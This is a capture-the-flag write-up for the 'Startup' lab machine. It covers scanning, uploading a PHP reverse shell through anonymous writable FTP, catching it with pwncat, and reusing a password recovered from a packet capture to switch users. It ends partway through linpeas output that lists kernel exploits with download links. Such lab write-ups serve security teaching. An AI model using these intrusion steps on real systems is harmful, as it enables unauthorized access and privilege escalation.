# Startup

Laurent Chauvin | October 31, 2022

## Resources

[1] https://github.com/wildkindcc/Exploitation/raw/master/00.PostExp_Linux/pspy/pspy64

## Progress

```
export IP=10.10.70.66
```

Nmap scan:
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 22:56 EDT
Nmap scan report for 10.10.70.66
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.18.23.136
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.09 seconds
```

Gobuster scan:
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log 

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.70.66
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/31 22:57:33 Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 310] [--> http://10.10.70.66/files/]
/server-status        (Status: 403) [Size: 276]
```

Nikto scan:
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.70.66
+ Target Hostname:    10.10.70.66
+ Target Port:        80
+ Start Time:         2022-10-31 22:59:06 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 328, size: 5b3e1b06be884, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3268: /files/: Directory indexing found.
+ OSVDB-3092: /files/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-10-31 23:15:15 (GMT-4) (969 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested                                       
```

Anonymous ftp seems allowed:
```
ftp $IP
Connected to 10.10.70.66.
220 (vsFTPd 3.0.3)
Name (10.10.70.66:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||63967|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> mget ftp important.jpg notice.txt
mget important.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||58683|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |***********************************************************************************************************************************************************************************************|   245 KiB  111.48 KiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:02 (106.50 KiB/s)
mget notice.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||31759|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |***********************************************************************************************************************************************************************************************|   208        3.14 MiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (2.04 KiB/s)
```

Notice.txt
```
cat notice.txt 

Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

We possibly have a username for ssh: 'maya'.

Something seems written on the 'important.jpg', but can't read it.

Let's try to upload a reverse shell through FTP instead.
```
tp $IP
Connected to 10.10.70.66.
220 (vsFTPd 3.0.3)
Name (10.10.70.66:kali): anonymous
331 Please specify the password.
Password: <Enter>
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> put revshell.php
local: revshell.php remote: revshell.php
229 Entering Extended Passive Mode (|||59834|)
150 Ok to send data.
100% |***********************************************************************************************************************************************************************************************|  5494       36.63 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (25.65 KiB/s)
ftp> dir
229 Entering Extended Passive Mode (|||48103|)
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118          5494 Nov 01 03:26 revshell.php
226 Directory send OK.
ftp> 
```

Start pwncat
```
cd /opt/pwncat
poetry shell
pwncat-cs -lp 9999
```

Visit: 'http://10.10.70.66/files/ftp/revshell.php'



Get Secret Recipe
```
(remote) www-data@startup:/$ cat recipe.txt

Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

As 'www-data' we only have access to 1 folder:
```
(remote) www-data@startup:/$ ls -al
total 100
drwxr-xr-x  25 root     root      4096 Nov  1 02:55 .
drwxr-xr-x  25 root     root      4096 Nov  1 02:55 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Nov  1 02:55 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 137 root     root         0 Nov  1 02:54 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       920 Nov  1 03:20 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Nov  1 02:55 sys
drwxrwxrwt   7 root     root      4096 Nov  1 03:31 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
```

It seems to contain a wireshark file
```
(remote) www-data@startup:/incidents$ ls

suspicious.pcapng
```

Download it with pwncat
```
(local) pwncat$ download suspicious.pcapng
suspicious.pcapng ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 31.2/31.2 KB • ? • 0:00:00
[23:33:35] downloaded 31.22KiB in 0.84 seconds              
```

Open wireshark, right click -> Follow -> TCP Stream

These data seems to show a previous hacker getting a reverse shell:
```
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ ls
bin
boot
data
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old

$ ls -la
total 96
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
drwx------   2 root     root     16384 Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
drwx------   3 root     root      4096 Oct  2 17:24 root
drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
drwxr-xr-x   2 root     root      4096 Oct  2 17:20 snap
drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic

$ whoami
www-data

$ python -c "import pty;pty.spawn('/bin/bash')"

www-data@startup:/$ cd
cd
bash: cd: HOME not set

www-data@startup:/$ ls
ls
bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
boot  home	  lib		  mnt	 root	     srv   vagrant
data  incidents   lib64		  opt	 run	     sys   var
dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz

www-data@startup:/$ cd home
cd home

www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied

www-data@startup:/home$ ls
ls
lennie

www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied

www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

sudo: 3 incorrect password attempts

www-data@startup:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:

www-data@startup:/home$ exit
exit
exit
$ exit
```

We found a 'lennie' user as well as 'ftpsecure'.

We can see the password 'c4ntg3t3n0ughsp1c3' has been tested twice.

Maybe it's worth trying to login as ftpsecure with this password.
```
(remote) www-data@startup:/incidents$ su ftpsecure
Password: c4ntg3t3n0ughsp1c3
su: Authentication failure
(remote) www-data@startup:/incidents$ su lennie
Password: c4ntg3t3n0ughsp1c3
lennie@startup:/incidents$ 
```

Didn't work with ftpsecure, but worked for user lennie.

Get User's flag
```
lennie@startup:~$ cat user.txt

THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

Time to privesc. In lennie's home dir, we can find a directory called 'scripts' owned by root
```
lennie@startup:~/scripts$ ls -al
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Nov  1 03:49 startup_list.txt
```

```
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

Another directory can be found: Document, but nothing interesting:
```
lennie@startup:~/Documents$ ls
concern.txt  list.txt  note.txt

lennie@startup:~/Documents$ cat concern.txt 
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie

lennie@startup:~/Documents$ cat list.txt 
Shoppinglist: Cyberpunk 2077 | Milk | Dog food

lennie@startup:~/Documents$ cat note.txt 
Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
```

Upload linpeas from pwncat
```
(local) pwncat$ upload /opt/linpeas.sh
./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 827.8/827.8 KB • ? • 0:00:00
[23:52:48] uploaded 827.83KiB in 6.41 seconds                                                                                                                                                                                   upload.py:77
(local) pwncat$                                        
```

Run linpeas
```
(remote) lennie@startup:/dev/shm$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 4.4.0-190-generic (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020
User & Groups: uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
Hostname: startup
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE
                                                                                                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                                          
Linux version 4.4.0-190-generic (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020                                                                        
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.7 LTS
Release: 16.04
Codename:       xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                             
Sudo version 1.8.16                                                                                                                                                                                                                         

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                                                                                                 

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                     
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games                                                                                                                                                    
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

╔══════════╣ Date & uptime
Tue Nov  1 03:53:28 UTC 2022                                                                                                                                                                                                                
 03:53:28 up 58 min,  0 users,  load average: 0.15, 0.03, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
LABEL=cloudimg-rootfs   /       ext4    defaults        0 0                                                                                                                                                                                 

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
HISTFILESIZE=0                                                                                                                                                                                                                              
MAIL=/var/mail/lennie
USER=lennie
SHLVL=3
OLDPWD=/home/lennie
HOME=/home/lennie
PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
LOGNAME=lennie
_=./linpeas.sh
XDG_SESSION_ID=c1
TERM=xterm-256color
HISTCONTROL=ignorespace
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
XDG_RUNTIME_DIR=/run/user/1002
APACHE_LOCK_DIR=/var/lock/apache2
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/bash
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/dev/shm
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                                                                                      
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
cat: write error: Broken pipe                                                                                                                                                                                                               
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
